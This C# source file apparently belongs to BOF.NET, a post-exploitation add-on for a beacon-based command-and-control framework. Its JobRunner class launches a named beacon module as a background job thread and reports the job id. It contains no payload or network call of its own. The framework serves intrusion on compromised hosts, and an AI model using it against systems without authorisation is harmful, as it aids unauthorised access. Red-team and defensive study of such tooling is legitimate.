using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace BOFNET.Bofs.Jobs {
    public class JobRunner : BeaconObject {
        public JobRunner(BeaconApi api) : base(api) {
        }

        public AppDomain LoadAssemblyInAppDomain(string appDomain, byte[] data, int len) {           
            return null;
        }

        public override void Go(string[] args) {

            if(args.Length == 0) {
                BeaconConsole.WriteLine("[!] Cannot run a job, no BOF.NET class specified to run");
                return;
            }

            BeaconJobWriter btw = new BeaconJobWriter();
            BeaconObject bo = Runtime.CreateBeaconObject(args[0], btw, new Runtime.LoadAssembyInAppDomainDelegate(LoadAssemblyInAppDomain));
            BeaconJob beaconJob = new BeaconJob(bo, args.Skip(1).ToArray(), btw);
            
            Runtime.Jobs[beaconJob.Thread.ManagedThreadId] = beaconJob;
            BeaconConsole.WriteLine($"[+] Started Task {args[0]} with job id {beaconJob.Thread.ManagedThreadId}");  
        }
    }
}
